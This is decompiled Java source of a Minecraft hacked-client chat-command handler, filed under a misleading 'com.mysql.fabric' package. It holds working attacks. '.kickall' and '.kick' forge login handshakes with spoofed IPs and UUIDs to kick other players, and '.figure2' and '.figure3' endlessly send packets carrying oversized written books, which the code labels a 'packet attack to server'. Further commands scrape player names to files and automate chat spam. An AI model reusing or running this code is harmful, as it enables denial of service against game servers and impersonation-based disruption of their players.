/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  com.google.common.base.Joiner
 *  com.mojang.authlib.GameProfile
 */
package com.mysql.fabric;

import com.google.common.base.Joiner;
import com.mojang.authlib.GameProfile;
import com.mysql.fabric.Module;
import com.mysql.fabric.Wrapper;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.InputStreamReader;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Random;
import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.ChatLine;
import net.minecraft.client.gui.GuiIngameMenu;
import net.minecraft.client.gui.GuiPlayerTabOverlay;
import net.minecraft.client.multiplayer.GuiConnecting;
import net.minecraft.client.network.NetHandlerLoginClient;
import net.minecraft.client.network.NetHandlerPlayClient;
import net.minecraft.client.network.NetworkPlayerInfo;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.EnumConnectionState;
import net.minecraft.network.NetworkManager;
import net.minecraft.network.handshake.client.C00Handshake;
import net.minecraft.network.login.client.CPacketLoginStart;
import net.minecraft.network.play.client.CPacketChatMessage;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.util.datafix.Binds;
import net.minecraft.util.datafix.FileManager;

public class ChatCommands {
    public static boolean isGetData = false;
    public static String fileData = "";
    public static String fileList = "";
    public static String IPKick;
    public static int PortKick;
    public static int delayList;
    public static String key;
    public static String nickchange;
    private static ItemStack book;
    private static ItemStack sign;
    private static String changeMessageFromServer;
    private static int BThread;
    private static HashSet pluginChannels;

    static {
        delayList = 2000;
        book = new ItemStack(Items.WRITTEN_BOOK);
        sign = new ItemStack(Items.SIGN);
        changeMessageFromServer = "{from_server}";
        BThread = 0;
        pluginChannels = new HashSet();
    }

    public static void commands(final String message) {
        String[] args;
        File txt;
        List players;
        NetHandlerPlayClient connection;
        if (message.startsWith(".say")) {
            try {
                Wrapper.sendPacket(new CPacketChatMessage(message.split(".say ")[1]));
                return;
            }
            catch (Exception ex) {
                Wrapper.msg("&cError! Correct:", true);
                Wrapper.msg("&a.say [Message]", true);
            }
        }
        if (message.equalsIgnoreCase(".help")) {
            Wrapper.msg("", true);
            Wrapper.msg("&a.creativefind - Get list of players in CREATIVE mode.", false);
            Wrapper.msg("&a.playerfind - Get list all of players.", false);
            Wrapper.msg("&a.kickall [IP] [Port] - Kick all players (IPWhiteList).", false);
            Wrapper.msg("&a.setkick [IP] [Port] - Set IP:Port of server for kick player.", false);
            Wrapper.msg("&a.kick [Nick] - Kick player.", false);
            Wrapper.msg("&a.nickchange [Nick] - Hide your nick.", false);
            Wrapper.msg("&a.getuuid [Nick] - Get player's UUID.", false);
            Wrapper.msg("&a.getbaltop [Start Page] [End Page] - get all players from baltop.", false);
            Wrapper.msg("&a.say [Message] - send message to chat.", false);
            Wrapper.msg("&a.figure2 - packet attack to server (Requires 2 or more clients).", false);
            Wrapper.msg("&a.bind - binding.", false);
            Wrapper.msg("&a.toggle [Module] - on/off module.", false);
            Wrapper.msg("&a.figure3 - packet attack to server (Requires 2 or more clients).", false);
            Wrapper.msg("&a.setlist [Path to file] - set path to file with lines for spam (Send {from_list} to chat).", false);
            Wrapper.msg("&a.setdelay [Delay in milliseconds] - set delay for spam.", false);
            Wrapper.msg("&a.startserver [Port] - start chat server.", false);
            Wrapper.msg("&a.toserver [IP] [Port] [Message] - send message to chat server.", false);
            Wrapper.msg("&a.setfromserver [Message with {from_server}] - change message from server.", false);
        }
        if (message.equalsIgnoreCase(".creativefind")) {
            connection = Wrapper.player().connection;
            players = GuiPlayerTabOverlay.ENTRY_ORDERING.sortedCopy(connection.getPlayerInfoMap());
            Wrapper.getFiles();
            txt = new File(String.valueOf(FileManager.getClientDir()) + "CreativeFinder\\" + Wrapper.mc().getCurrentServerData().serverIP.split(":")[0] + ".txt");
            if (txt.exists()) {
                txt.delete();
            }
            for (NetworkPlayerInfo n : players) {
                if (!n.getGameType().isCreative()) continue;
                Wrapper.getFiles();
                FileManager.write(txt, n.getGameProfile().getName());
            }
            Wrapper.msg("&eList of players in &6CREATIVE MODE &esaved in file", true);
            Wrapper.msg("&e" + txt.getPath(), false);
        }
        if (message.equalsIgnoreCase(".playerfind")) {
            connection = Wrapper.player().connection;
            players = GuiPlayerTabOverlay.ENTRY_ORDERING.sortedCopy(connection.getPlayerInfoMap());
            Wrapper.getFiles();
            txt = new File(String.valueOf(FileManager.getClientDir()) + "PlayerFinder\\" + Wrapper.mc().getCurrentServerData().serverIP.split(":")[0] + ".txt");
            if (txt.exists()) {
                txt.delete();
            }
            for (NetworkPlayerInfo n : players) {
                Wrapper.getFiles();
                FileManager.write(txt, n.getGameProfile().getName());
            }
            Wrapper.msg("&eList of players saved in file", true);
            Wrapper.msg("&e" + txt.getPath(), false);
        }
        if (message.startsWith(".kickall")) {
            new Thread(){

                @Override
                public void run() {
                    try {
                        String[] s = message.split(" ");
                        int port = Integer.parseInt(s[2]);
                        NetHandlerPlayClient connection = Wrapper.player().connection;
                        List players = GuiPlayerTabOverlay.ENTRY_ORDERING.sortedCopy(connection.getPlayerInfoMap());
                        for (NetworkPlayerInfo n : players) {
                            if (n.getGameProfile().getId().toString().equals(Wrapper.player().getUniqueID().toString())) continue;
                            Random rand = new Random();
                            InetAddress var1 = null;
                            var1 = InetAddress.getByName(s[1]);
                            GuiConnecting.networkManager2 = NetworkManager.createNetworkManagerAndConnect(var1, port, Minecraft.getMinecraft().gameSettings.isUsingNativeTransport());
                            GuiConnecting.networkManager2.setNetHandler(new NetHandlerLoginClient(GuiConnecting.networkManager2, Minecraft.getMinecraft(), new GuiIngameMenu()));
                            GuiConnecting.networkManager2.sendPacket(new C00Handshake(String.valueOf(s[1]) + "\u0000" + "32.123." + String.valueOf(rand.nextInt(255)) + "." + String.valueOf(rand.nextInt(255)) + "\u0000" + n.getGameProfile().getId().toString(), port, EnumConnectionState.LOGIN));
                            GuiConnecting.networkManager2.sendPacket(new CPacketLoginStart(new GameProfile(null, String.valueOf(n.getGameProfile().getName()) + "B")));
                            Thread.sleep(0L);
                        }
                        Wrapper.msg("&eKickAll.", true);
                    }
                    catch (Exception ex) {
                        Wrapper.msg("&cError! Correct:", true);
                        Wrapper.msg("&a.kickall [IP] [Port]", true);
                    }
                }
            }.start();
        }
        if (message.startsWith(".setkick")) {
            try {
                String[] s2 = message.split(" ");
                IPKick = s2[1];
                PortKick = Integer.parseInt(s2[2]);
                Wrapper.msg("&aKick on server: &e" + IPKick + ":" + PortKick + "&a.", true);
            }
            catch (Exception ex) {
                Wrapper.msg("&cError! Correct:", true);
                Wrapper.msg("&a.setkick [IP] [Port]", true);
            }
        }
        if (message.startsWith(".kick")) {
            new Thread(){

                @Override
                public void run() {
                    try {
                        String[] s = message.split(" ");
                        NetHandlerPlayClient connection = Wrapper.player().connection;
                        List players = GuiPlayerTabOverlay.ENTRY_ORDERING.sortedCopy(connection.getPlayerInfoMap());
                        for (NetworkPlayerInfo n : players) {
                            if (!n.getGameProfile().getName().equals(s[1])) continue;
                            Random rand = new Random();
                            InetAddress var1 = null;
                            var1 = InetAddress.getByName(IPKick);
                            GuiConnecting.networkManager2 = NetworkManager.createNetworkManagerAndConnect(var1, PortKick, Minecraft.getMinecraft().gameSettings.isUsingNativeTransport());
                            GuiConnecting.networkManager2.setNetHandler(new NetHandlerLoginClient(GuiConnecting.networkManager2, Minecraft.getMinecraft(), new GuiIngameMenu()));
                            GuiConnecting.networkManager2.sendPacket(new C00Handshake(String.valueOf(IPKick) + "\u0000" + "32.123." + String.valueOf(rand.nextInt(255)) + "." + String.valueOf(rand.nextInt(255)) + "\u0000" + n.getGameProfile().getId().toString(), PortKick, EnumConnectionState.LOGIN));
                            GuiConnecting.networkManager2.sendPacket(new CPacketLoginStart(n.getGameProfile()));
                            Wrapper.msg("&eKick player " + n.getGameProfile().getName() + ".", true);
                        }
                    }
                    catch (Exception ex) {
                        Wrapper.msg("&cError! Correct:", true);
                        Wrapper.msg("&a.kickall [IP] [Port]", true);
                    }
                }
            }.start();
        }
        if (message.startsWith(".nickchange")) {
            try {
                nickchange = message.split(".nickchange ")[1];
                Wrapper.msg("Nick changed.", true);
            }
            catch (Exception e) {
                Wrapper.msg("&cError! Correct:", true);
                Wrapper.msg("&a.nickchange [Nick]", true);
            }
        }
        if (message.equalsIgnoreCase(".getuuid2")) {
            try {
                Wrapper.msg(Wrapper.player().getUniqueID().toString(), true);
            }
            catch (Exception e) {
                Wrapper.msg("&cError!", true);
            }
        }
        if (message.equalsIgnoreCase(".getuuid")) {
            try {
                String nick = message.split(".getuuid ")[1];
                NetHandlerPlayClient connection2 = Wrapper.player().connection;
                List players2 = GuiPlayerTabOverlay.ENTRY_ORDERING.sortedCopy(connection2.getPlayerInfoMap());
                for (NetworkPlayerInfo n : players2) {
                    Wrapper.msg(n.getGameProfile().getId().toString(), true);
                }
            }
            catch (Exception e) {
                Wrapper.msg("&cError! Correct:", true);
                Wrapper.msg("&a.getuuid [Nick]", true);
            }
        }
        if ((args = message.split(" "))[0].equalsIgnoreCase(".toggle")) {
            try {
                Module m = Wrapper.getModule(args[1]);
                if (m == null) {
                    Wrapper.msg("&cError! Correct:", true);
                    Wrapper.msg("&a.toggle [Module]", false);
                }
                m.toggle();
                if (m.isToggled()) {
                    Wrapper.player().connection.gameController.ingameGUI.displayTitle("\u0424\u0443\u043d\u043a\u0446\u0438\u044f " + m.getName() + " enabled", "", 1, 3, 1);
                } else {
                    Wrapper.player().connection.gameController.ingameGUI.displayTitle("\u0424\u0443\u043d\u043a\u0446\u0438\u044f " + m.getName() + " disabled", "", 1, 3, 1);
                }
            }
            catch (Exception ex) {
                Wrapper.msg("&cError! Correct:", true);
                Wrapper.msg("&a.toggle [Module]", false);
            }
        }
        if (args[0].equalsIgnoreCase(".bind")) {
            try {
                if (args[1].equalsIgnoreCase("add")) {
                    Wrapper.getBinds();
                    Binds.addBind(args[2], message.replace(String.valueOf(args[0]) + " " + args[1] + " " + args[2] + " ", ""));
                } else if (args[1].equalsIgnoreCase("del")) {
                    Wrapper.getBinds();
                    Binds.delBind(args[2]);
                }
                Wrapper.getFiles().saveBinds();
            }
            catch (Exception ex) {
                Wrapper.msg("&cError! Correct:", true);
                Wrapper.msg("&a.bind del [key] - delete bind.", false);
                Wrapper.msg("&a.bind add [key] [message] - add bind.", false);
            }
        }
        if (message.startsWith(".setkey")) {
            try {
                key = message.split(".setkey ")[1];
                Wrapper.msg("Key installed.", true);
            }
            catch (Exception e) {
                Wrapper.msg("&cError! Correct:", true);
                Wrapper.msg("&a.setkey [Key]", true);
            }
        }
        if (message.startsWith(".check")) {
            new Thread(){

                @Override
                public void run() {
                    try {
                        String inputLine;
                        String[] forNick = message.split(".check ");
                        String url = "http://www.crashinyou.me/api_check_name.php";
                        URL obj = new URL(url);
                        HttpURLConnection con = (HttpURLConnection)obj.openConnection();
                        con.setRequestMethod("POST");
                        con.setRequestProperty("User-Agent", "MrBeast");
                        con.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
                        String urlParameters = "nick=" + forNick[1] + "&key=" + URLEncoder.encode(key, "UTF-8");
                        con.setDoOutput(true);
                        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
                        wr.writeBytes(urlParameters);
                        wr.flush();
                        wr.close();
                        BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
                        String result = "";
                        while ((inputLine = in.readLine()) != null) {
                            result = new String(inputLine.toString().replace("<br/>", "\n").getBytes(), Charset.forName("UTF-8"));
                        }
                        try {
                            Wrapper.msg("Result for " + forNick[1] + ":", true);
                            Wrapper.msg("___________________", true);
                            int i = 0;
                            while (i < result.split("\n").length) {
                                Wrapper.msg(result.split("\n")[i], true);
                                ++i;
                            }
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                        in.close();
                    }
                    catch (Exception e) {
                        Wrapper.msg("&cError! Correct:", true);
                        Wrapper.msg("&a.check [Nick]", true);
                    }
                }
            }.start();
        }
        if (args[0].equalsIgnoreCase(".figure2")) {
            new Thread(){

                @Override
                public void run() {
                    try {
                        Wrapper.msg("Attack!", true);
                        ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
                        NBTTagList list = new NBTTagList();
                        NBTTagCompound tag = new NBTTagCompound();
                        String author = Minecraft.getMinecraft().getSession().getUsername();
                        String title = "Title";
                        String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                        int i = 0;
                        while (i < 50) {
                            String siteContent = size;
                            NBTTagString tString = new NBTTagString(siteContent);
                            list.appendTag(tString);
                            ++i;
                        }
                        tag.setString("author", author);
                        tag.setString("title", title);
                        tag.setTag("pages", list);
                        bookObj.setTagInfo("pages", list);
                        bookObj.setTagCompound(tag);
                        while (true) {
                            Wrapper.sendPacket(new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, 0));
                            Thread.sleep(12L);
                        }
                    }
                    catch (Exception e) {
                        e.printStackTrace();
                        return;
                    }
                }
            }.start();
        }
        if (message.startsWith(".getbaltop")) {
            new Thread(){

                @Override
                public void run() {
                    try {
                        Wrapper.getFiles();
                        File txt = new File(String.valueOf(FileManager.getClientDir()) + "BalTop\\" + Wrapper.mc().getCurrentServerData().serverIP.split(":")[0] + ".txt");
                        ArrayList<String> list = new ArrayList<String>();
                        int i = Integer.parseInt(message.split(" ")[1]);
                        while (i <= Integer.parseInt(message.split(" ")[2])) {
                            Wrapper.player().sendChatMessage("/baltop " + i);
                            Thread.sleep(2000L);
                            try {
                                for (ChatLine cl : Wrapper.mc().ingameGUI.getChatGUI().chatLines) {
                                    try {
                                        String name = cl.getChatComponent().getUnformattedText().split("[0-9]\\. ")[1].split(",")[0];
                                        if (list.contains(name)) continue;
                                        list.add(name);
                                    }
                                    catch (Exception exception) {
                                        // empty catch block
                                    }
                                }
                            }
                            catch (Exception cl) {
                                // empty catch block
                            }
                            ++i;
                        }
                        String listNicks = "";
                        for (String s : list) {
                            listNicks = String.valueOf(listNicks) + s + "\r\n";
                        }
                        if (listNicks.endsWith("\r\n")) {
                            listNicks = listNicks.substring(0, listNicks.length() - 2);
                        }
                        Wrapper.getFiles();
                        FileManager.write(txt, listNicks);
                        Wrapper.msg("Saved to " + txt.getPath(), true);
                    }
                    catch (Exception e) {
                        Wrapper.msg("&cError! Correct:", true);
                        Wrapper.msg("&a.getbaltop [Start Page] [End Page]", true);
                    }
                }
            }.start();
        }
        if (message.startsWith(".svsgetdata")) {
            try {
                if (message.split(" ")[1].equalsIgnoreCase("off")) {
                    isGetData = false;
                    Wrapper.msg("&cSVS getter data OFF!", true);
                    return;
                }
                isGetData = true;
                fileData = message.split(" ")[1];
                Wrapper.msg("&cSVS getter data enabled and setted on file: " + fileData, true);
            }
            catch (Exception e) {
                Wrapper.msg("&cError! Correct:", true);
                Wrapper.msg("&a.svsgetdata [File name] | [off]", true);
            }
        }
        if (message.startsWith(".setlist ")) {
            try {
                fileList = message.split(".setlist ")[1];
                Wrapper.msg("&cPath to file: " + fileList, true);
                Wrapper.getFiles().saveValues();
            }
            catch (Exception e) {
                Wrapper.msg("&cError! Correct:", true);
                Wrapper.msg("&a.setlist [Path to file]", true);
            }
        }
        if (message.startsWith(".setdelay ")) {
            try {
                delayList = Integer.parseInt(message.split(".setdelay ")[1]);
                Wrapper.msg("&cDelay for list: " + delayList, true);
                Wrapper.getFiles().saveValues();
            }
            catch (Exception e) {
                Wrapper.msg("&cError! Correct:", true);
                Wrapper.msg("&a.delaylist [Delay]", true);
            }
        }
        if (args[0].equalsIgnoreCase(".figure3")) {
            new Thread(){

                @Override
                public void run() {
                    try {
                        Wrapper.msg("Attack!", true);
                        ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
                        NBTTagList list = new NBTTagList();
                        NBTTagCompound tag = new NBTTagCompound();
                        String author = Minecraft.getMinecraft().getSession().getUsername();
                        String title = "Title";
                        String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                        int i = 0;
                        while (i < 50) {
                            String siteContent = size;
                            NBTTagString tString = new NBTTagString(siteContent);
                            list.appendTag(tString);
                            ++i;
                        }
                        tag.setString("author", author);
                        tag.setString("title", title);
                        tag.setTag("pages", list);
                        bookObj.setTagInfo("pages", list);
                        bookObj.setTagCompound(tag);
                        while (true) {
                            Wrapper.sendPacket(new CPacketCreativeInventoryAction(36, bookObj));
                            Thread.sleep(12L);
                        }
                    }
                    catch (Exception e) {
                        e.printStackTrace();
                        return;
                    }
                }
            }.start();
        }
        if (message.startsWith(".startserver ")) {
            Thread serverThread = new Thread(){

                @Override
                public void run() {
                    try {
                        Wrapper.msg("&cServer started on port " + Integer.parseInt(message.split(".startserver ")[1]), true);
                        DatagramSocket socket = new DatagramSocket(Integer.parseInt(message.split(".startserver ")[1]));
                        byte[] buf = new byte[256];
                        while (true) {
                            DatagramPacket packet = new DatagramPacket(buf, buf.length);
                            socket.receive(packet);
                            InetAddress address = packet.getAddress();
                            int port = packet.getPort();
                            packet = new DatagramPacket(buf, buf.length, address, port);
                            String received = new String(packet.getData(), 0, packet.getLength());
                            Wrapper.player().sendChatMessage(changeMessageFromServer.replace("{from_server}", received));
                        }
                    }
                    catch (Exception e) {
                        Wrapper.msg("&cError! Correct:", true);
                        Wrapper.msg("&a.startserver [Port]", true);
                        return;
                    }
                }
            };
            serverThread.start();
        }
        if (message.startsWith(".setfromserver ")) {
            try {
                if (!message.split(".setfromserver ")[1].contains("{from_server}")) {
                    throw new Exception();
                }
                changeMessageFromServer = message.split(".setfromserver ")[1];
                Wrapper.msg("&cMessage changed!", true);
            }
            catch (Exception e) {
                Wrapper.msg("&cError! Correct:", true);
                Wrapper.msg("&a.setfromserver [Message with {from_server}]", true);
            }
        }
        if (message.startsWith(".toserver ")) {
            try {
                String sIP = message.split(" ")[1];
                int sPort = Integer.parseInt(message.split(" ")[2]);
                DatagramSocket socket = new DatagramSocket();
                InetAddress address = InetAddress.getByName(sIP);
                String toServer = message.split(".toserver " + sIP + " " + sPort + " ")[1];
                byte[] buf = toServer.getBytes();
                DatagramPacket packet = new DatagramPacket(buf, buf.length, address, sPort);
                socket.send(packet);
                Wrapper.msg("&cMessage was sent!", true);
            }
            catch (Exception e) {
                e.printStackTrace();
                Wrapper.msg("&cError! Correct:", true);
                Wrapper.msg("&a.toserver [IP] [Port] [Message]", true);
            }
        }
    }

    public static String format(Iterable<?> objects, String separators) {
        return Joiner.on((String)separators).join(objects);
    }
}

